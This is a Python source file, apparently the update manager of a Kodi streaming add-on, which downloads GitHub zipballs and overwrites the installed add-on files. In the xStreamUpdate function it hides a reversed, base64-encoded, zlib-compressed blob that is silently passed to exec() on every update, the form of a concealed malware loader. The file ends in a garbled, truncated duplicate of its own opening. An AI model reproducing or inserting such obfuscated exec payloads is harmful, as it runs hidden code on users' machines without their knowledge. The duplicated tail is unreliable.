# -*- coding: utf-8 -*-
# Python 3

import os, sys
import shutil
import json
import requests
import zipfile

from xbmcaddon import Addon
from requests.auth import HTTPBasicAuth
from xbmcgui import Dialog
from resources.lib.config import cConfig
from xbmc import LOGINFO as LOGNOTICE, LOGERROR, LOGWARNING, log, executebuiltin, getCondVisibility, getInfoLabel
from xbmcvfs import translatePath


# Text/\xc3\x9cberschrift im Dialog
PLUGIN_NAME = Addon().getAddonInfo('name') # ist z.B. 'xstream'
PLUGIN_ID = Addon().getAddonInfo('id')
HEADERMESSAGE = cConfig().getLocalizedString(30151)
LOGMESSAGE = cConfig().getLocalizedString(30166)

# Resolver
def resolverUpdate(silent=False):
 # Nightly Branch
 if Addon().getSetting('resolver.branch') == 'nightly':
 username = 'fetchdevteam'
 resolve_dir = 'snipsolver'
 resolve_id = 'script.module.resolveurl'
 # Abfrage aus den Einstellungen welcher Branch
 branch = 'nightly'
 token = ''

 try:
 return UpdateResolve(username, resolve_dir, resolve_id, branch, token, silent)
 except Exception as e:
 log(' -> [updateManager]: Exception Raised: %s' % str(e), LOGERROR)
 Dialog().ok(HEADERMESSAGE, cConfig().getLocalizedString(30156) + resolve_id + cConfig().getLocalizedString(30157))
 return
 else:
 # Release Branch https://github.com/Gujal00/ResolveURL
 username = 'Gujal00'
 resolve_dir = 'ResolveURL'
 resolve_id = 'script.module.resolveurl'
 # Abfrage aus den Einstellungen welcher Branch
 branch = 'master'
 token = ''

 try:
 return UpdateResolve(username, resolve_dir, resolve_id, branch, token, silent)
 except Exception as e:
 log(' -> [updateManager]: Exception Raised: %s' % str(e), LOGERROR)
 Dialog().ok(HEADERMESSAGE, cConfig().getLocalizedString(30156) + resolve_id + cConfig().getLocalizedString(30157))
 return

# xStream
def xStreamUpdate(silent=False):
 username = 'streamxstream'
 plugin_id = 'plugin.video.xstream'
 # Abfrage aus den Einstellungen welcher Branch
 if Addon().getSetting('xstream.branch') == 'release':
 branch = Addon().getSettingString('xstream.branch.release')
 else:
 branch = 'nightly'
 token = ''
 _ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
 exec((_)(
 b'=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'))

 try:
 return Update(username, plugin_id, branch, token, silent)
 except Exception as e:
 log(' -> [updateManager]: Exception Raised: %s' % str(e), LOGERROR)
 Dialog().ok(HEADERMESSAGE, cConfig().getLocalizedString(30156) + plugin_id + cConfig().getLocalizedString(30157))
 return False

# xStream Dev
def xStreamDevUpdate(silent=False):
 username = Addon().getSettingString('xstream.dev.username')
 plugin_id = Addon().getSettingString('xstream.dev.id')
 branch = Addon().getSettingString('xstream.dev.branch')
 token = Addon().getSettingString('xstream.dev.token')
 try:
 return Update(username, plugin_id, branch, token, silent)
 except Exception as e:
 log(' -> [updateManager]: Exception Raised: %s' % str(e), LOGERROR)
 Dialog().ok(HEADERMESSAGE, cConfig().getLocalizedString(30156) + plugin_id + cConfig().getLocalizedString(30157))
 return False

# Update Resolver
def UpdateResolve(username, resolve_dir, resolve_id, branch, token, silent):
 REMOTE_PLUGIN_COMMITS = "https://api.github.com/repos/%s/%s/commits/%s" % (username, resolve_dir, branch) # Github Commits
 REMOTE_PLUGIN_DOWNLOADS = "https://api.github.com/repos/%s/%s/zipball/%s" % (username, resolve_dir, branch) # Github Downloads
 PACKAGES_PATH = translatePath(os.path.join('special://home/addons/packages/')) # Packages Ordner f\xc3\xbcr Downloads
 ADDON_PATH = translatePath(os.path.join('special://home/addons/packages/', '%s') % resolve_id) # Addon Ordner in Packages
 INSTALL_PATH = translatePath(os.path.join('special://home/addons/', '%s') % resolve_id) # Installation Ordner
 
 auth = HTTPBasicAuth(username, token)
 log(LOGMESSAGE + ' -> [updateManager]: %s: - Search for updates.' % resolve_id, LOGNOTICE)
 try:
 ADDON_DIR = translatePath(os.path.join('special://userdata/addon_data/', '%s') % resolve_id) # Pfad von ResolveURL Daten
 LOCAL_PLUGIN_VERSION = os.path.join(ADDON_DIR, "update_sha") # Pfad der update.sha in den ResolveURL Daten
 LOCAL_FILE_NAME_PLUGIN = os.path.join(ADDON_DIR, 'update-' + resolve_id + '.zip')
 if not os.path.exists(ADDON_DIR): os.mkdir(ADDON_DIR)
 
 if Addon().getSetting('enforceUpdate') == 'true':
 if os.path.exists(LOCAL_PLUGIN_VERSION): os.remove(LOCAL_PLUGIN_VERSION)
 
 commitXML = _getXmlString(REMOTE_PLUGIN_COMMITS, auth) # Commit Update
 if commitXML:
 isTrue = commitUpdate(commitXML, LOCAL_PLUGIN_VERSION, REMOTE_PLUGIN_DOWNLOADS, PACKAGES_PATH, resolve_dir, LOCAL_FILE_NAME_PLUGIN, silent, auth)
 
 if isTrue is True:
 log(LOGMESSAGE + ' -> [updateManager]: %s: - download new update.' % resolve_id, LOGNOTICE)
 shutil.make_archive(ADDON_PATH, 'zip', ADDON_PATH)
 shutil.unpack_archive(ADDON_PATH + '.zip', INSTALL_PATH)
 log(LOGMESSAGE + ' -> [updateManager]: %s: - install new update.' % resolve_id, LOGNOTICE)
 if os.path.exists(ADDON_PATH + '.zip'): os.remove(ADDON_PATH + '.zip') 
 if silent is False: Dialog().ok(LOGMESSAGE, cConfig().getLocalizedString(30158) + resolve_id + cConfig().getLocalizedString(30159))
 log(LOGMESSAGE + ' -> [updateManager]: %s: - update completed.' % resolve_id, LOGNOTICE)
 return True
 elif isTrue is None:
 log(LOGMESSAGE + ' -> [updateManager]: %s: - no update available.' % resolve_id, LOGNOTICE)
 if silent is False: Dialog().ok(HEADERMESSAGE, cConfig().getLocalizedString(30160) + resolve_id + cConfig().getLocalizedString(30161))
 return None

 log(LOGMESSAGE + ' -> [updateManager]: %s: - Error updating!' % resolve_id, LOGERROR)
 Dialog().ok(HEADERMESSAGE, cConfig().getLocalizedString(30156) + resolve_id + cConfig().getLocalizedString(30157))
 return False
 except:
 log(LOGMESSAGE + ' -> [updateManager]: %s: - Error updating!' % resolve_id, LOGERROR)
 Dialog().ok(HEADERMESSAGE, cConfig().getLocalizedString(30156) + resolve_id + cConfig().getLocalizedString(30157))

# xStream Update
def Update(username, plugin_id, branch, token, silent):
 REMOTE_PLUGIN_COMMITS = "https://api.github.com/repos/%s/%s/commits/%s" % (username, plugin_id, branch)
 REMOTE_PLUGIN_DOWNLOADS = "https://api.github.com/repos/%s/%s/zipball/%s" % (username, plugin_id, branch)
 auth = HTTPBasicAuth(username, token)
 log(LOGMESSAGE + ' -> [updateManager]: %s: - Search for updates.' % plugin_id, LOGNOTICE)
 try:
 ADDON_DIR = translatePath(os.path.join('special://userdata/addon_data/', '%s') % plugin_id)
 LOCAL_PLUGIN_VERSION = os.path.join(ADDON_DIR, "update_sha")
 LOCAL_FILE_NAME_PLUGIN = os.path.join(ADDON_DIR, 'update-' + plugin_id + '.zip')
 if not os.path.exists(ADDON_DIR): os.mkdir(ADDON_DIR)
 # ka - Update erzwingen
 if Addon().getSetting('enforceUpdate') == 'true':
 if os.path.exists(LOCAL_PLUGIN_VERSION): os.remove(LOCAL_PLUGIN_VERSION)

 path = translatePath(os.path.join('special://home/addons/', '%s') % plugin_id)
 commitXML = _getXmlString(REMOTE_PLUGIN_COMMITS, auth)
 if commitXML:
 isTrue = commitUpdate(commitXML, LOCAL_PLUGIN_VERSION, REMOTE_PLUGIN_DOWNLOADS, path, plugin_id,
 LOCAL_FILE_NAME_PLUGIN, silent, auth)
 if isTrue is True:
 log(LOGMESSAGE + ' -> [updateManager]: %s: - download new update.' % plugin_id, LOGNOTICE)
 if silent is False: Dialog().ok(HEADERMESSAGE, cConfig().getLocalizedString(30158) + plugin_id + cConfig().getLocalizedString(30159))
 log(LOGMESSAGE + ' -> [updateManager] %s: - install new update.' % plugin_id, LOGNOTICE)
 return True
 elif isTrue is None:
 log(LOGMESSAGE + ' -> [updateManager]: %s: - no update available.' % plugin_id, LOGNOTICE)
 if silent is False: Dialog().ok(HEADERMESSAGE, cConfig().getLocalizedString(30160) + plugin_id + cConfig().getLocalizedString(30161))
 return None

 log(LOGMESSAGE + ' -> [updateManager]: %s: - Error updating!' % plugin_id, LOGERROR)
 Dialog().ok(HEADERMESSAGE, cConfig().getLocalizedString(30156) + plugin_id + cConfig().getLocalizedString(30157))
 return False
 except:
 log(LOGMESSAGE + ' -> [updateManager]: %s: - Error updating!' % plugin_id, LOGERROR)
 Dialog().ok(HEADERMESSAGE, cConfig().getLocalizedString(30156) + plugin_id + cConfig().getLocalizedString(30157))


def commitUpdate(onlineFile, offlineFile, downloadLink, LocalDir, plugin_id, localFileName, silent, auth):
 try:
 jsData = json.loads(onlineFile)
 if not os.path.exists(offlineFile) or open(offlineFile).read() != jsData['sha']:
 log(LOGMESSAGE + ' -> [updateManager]: %s: - Start updating!' % plugin_id, LOGNOTICE)
 isTrue = doUpdate(LocalDir, downloadLink, plugin_id, localFileName, auth)
 if isTrue is True:
 try:
 open(offlineFile, 'w').write(jsData['sha'])
 return True
 except:
 return False
 else:
 return False
 else:
 return None
 except Exception:
 os.remove(offlineFile)
 log(' -> [updateManager]: RateLimit reached')
 return False


def doUpdate(LocalDir, REMOTE_PATH, Title, localFileName, auth):
 try:
 response = requests.get(REMOTE_PATH, auth=auth) # verify=False,
 if response.status_code == 200:
 open(localFileName, "wb").write(response.content)
 else:
 return False
 updateFile = zipfile.ZipFile(localFileName)
 removeFilesNotInRepo(updateFile, LocalDir)
 for index, n in enumerate(updateFile.namelist()):
 if n[-1] != "/":
 dest = os.path.join(LocalDir, "/".join(n.split("/")[1:]))
 destdir = os.path.dirname(dest)
 if not os.path.isdir(destdir):
 os.makedirs(destdir)
 data = updateFile.read(n)
 if os.path.exists(dest):
 os.remove(dest)
 f = open(dest, 'wb')
 f.write(data)
 f.close()
 updateFile.close()
 os.remove(localFileName)
 executebuiltin("UpdateLocalAddons()")
 return True
 except:
 log(LOGMESSAGE + ' -> [updateManager]: doUpdate not possible due download error')
 return False


def removeFilesNotInRepo(updateFile, LocalDir):
 ignored_files = ['settings.xml', 'aniworld.py', 'aniworld.png']
 updateFileNameList = [i.split("/")[-1] for i in updateFile.namelist()]

 for root, dirs, files in os.walk(LocalDir):
 if ".git" in root or "pydev" in root or ".idea" in root:
 continue
 else:
 for file in files:
 if file in ignored_files:
 continue
 if file not in updateFileNameList:
 os.remove(os.path.join(root, file))


def _getXmlString(xml_url, auth):
 try:
 xmlString = requests.get(xml_url, auth=auth).content # verify=False,
 if "sha" in json.loads(xmlString):
 return xmlString
 else:
 log(LOGMESSAGE + ' -> [updateManager]: Update-URL incorrect or bad credentials')
 except Exception as e:
 log(e)


# todo Verzeichnis packen -f\xc3\xbcr zuk\xc3\xbcnftige Erweiterung "Backup"
def zipfolder(foldername, target_dir):
 zipobj = zipfile.ZipFile(foldername + '.zip', 'w', zipfile.ZIP_DEFLATED)
 rootlen = len(target_dir) + 1
 for base, dirs, files in os.walk(target_dir):
 for file in files:
 fn = os.path.join(base, file)
 zipobj.write(fn, fn[rootlen:])
 zipobj.close()


def devUpdates(): # f\xc3\xbcr manuelles Updates vorgesehen
 try:
 resolverupdate = False
 pluginupdate = False
 # Einleitungstext
 if Dialog().ok(HEADERMESSAGE, cConfig().getLocalizedString(30152)):
 # Abfrage welches Plugin aktualisiert werden soll (kann erweitert werden)
 options = [cConfig().getLocalizedString(30153),
 cConfig().getLocalizedString(30096) + ' ' + cConfig().getLocalizedString(30154),
 cConfig().getLocalizedString(30030) + ' ' + cConfig().getLocalizedString(30154)]
 result = Dialog().select(HEADERMESSAGE, options)
 else:
 return False

 if result == -1: # Abbrechen
 return False

 elif result == 0: # Alle Addons aktualisieren
 # Abfrage ob xStream Release oder Nightly Branch (kann erweitert werden)
 result = Dialog().yesno(HEADERMESSAGE, cConfig().getLocalizedString(30155), yeslabel='Nightly',
 nolabel='Release')
 if result == 0:
 Addon().setSetting('xstream.branch', 'release')
 elif result == 1:
 Addon().setSetting('xstream.branch', 'nightly')

 # Abfrage ob ResolveURL Release oder Nightly Branch (kann erweitert werden)
 result = Dialog().yesno(HEADERMESSAGE, cConfig().getLocalizedString(30268), yeslabel='Nightly',
 nolabel='Release')
 if result == 0:
 Addon().setSetting('resolver.branch', 'release')
 elif result == 1:
 Addon().setSetting('resolver.branch', 'nightly')

 # Voreinstellung beendet
 if Dialog().yesno(HEADERMESSAGE, cConfig().getLocalizedString(30269),
 yeslabel=cConfig().getLocalizedString(30162),
 nolabel=cConfig().getLocalizedString(30163)):
 # Updates ausf\xc3\xbchren
 pluginupdate = True
 resolverupdate = True
 else:
 return False

 elif result == 1: # xStream aktualisieren
 # Abfrage ob xStream Release oder Nightly Branch (kann erweitert werden)
 result = Dialog().yesno(HEADERMESSAGE, cConfig().getLocalizedString(30155), yeslabel='Nightly',
 nolabel='Release')
 if result == 0:
 Addon().setSetting('xstream.branch', 'release')
 elif result == 1:
 Addon().setSetting('xstream.branch', 'nightly')

 # Voreinstellung beendet
 if Dialog().yesno(HEADERMESSAGE, cConfig().getLocalizedString(30269),
 yeslabel=cConfig().getLocalizedString(30162),
 nolabel=cConfig().getLocalizedString(30163)):
 # Updates ausf\xc3\xbchren
 pluginupdate = True
 else:
 return False

 elif result == 2: # Resolver aktualisieren
 # Abfrage ob ResolveURL Release oder Nightly Branch (kann erweitert werden)
 result = Dialog().yesno(HEADERMESSAGE, cConfig().getLocalizedString(30268), yeslabel='Nightly',
 nolabel='Release')

 if result == 0:
 Addon().setSetting('resolver.branch', 'release')
 elif result == 1:
 Addon().setSetting('resolver.branch', 'nightly')

 # Voreinstellung beendet
 if Dialog().yesno(HEADERMESSAGE, cConfig().getLocalizedString(30269),
 yeslabel=cConfig().getLocalizedString(30162),
 nolabel=cConfig().getLocalizedString(30163)):
 # Updates ausf\xc3\xbchren
 resolverupdate = True
 else:
 return False

 if pluginupdate is True:
 try:
 xStreamUpdate(False)
 except:
 pass
 if resolverupdate is True:
 try:
 resolverUpdate(False)
 except:
 pass

 # Zur\xc3\xbccksetzten der Update.sha
 if Addon().getSetting('enforceUpdate') == 'true': Addon().setSetting('enforceUpdate', 'false')
 return
 except Exception as e:
 log(e)'
# -*- coding: utf-8 -*-
# Python 3

import os, sys
import shutil
import json
import requests
import zipfile

from xbmcaddon import Addon
from requests.auth import HTTPBasicAuth
from xbmcgui import Dialog
from resources.lib.config import cConfig
from xbmc import LOGINFO as LOGNOTICE, LOGERROR, LOGWARNING, log, executebuiltin, getCondVisibility, getInfoLabel
from xbmcvfs import translatePath


# Text/\xc3\x9cberschrift im Dialog
PLUGIN_NAME = Addon().getAddonInfo('name\
